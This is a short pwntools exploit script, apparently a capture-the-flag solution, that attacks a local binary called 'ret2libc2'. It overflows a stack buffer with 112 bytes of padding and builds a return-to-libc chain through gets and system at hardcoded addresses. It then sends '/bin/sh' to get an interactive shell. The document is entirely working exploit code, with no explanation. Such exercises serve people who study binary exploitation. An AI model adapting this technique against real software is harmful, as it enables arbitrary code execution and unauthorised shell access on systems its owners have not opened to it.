from pwn import *
context.log_level = 'debug'

p = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebp = 0x0804872f
bss_addr = 0x0804A040

payload = 'A'*112+p32(gets_plt)+p32(pop_ebp)+p32(bss_addr)+p32(system_plt)+p32(0xdeadbeef)+p32(bss_addr)

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
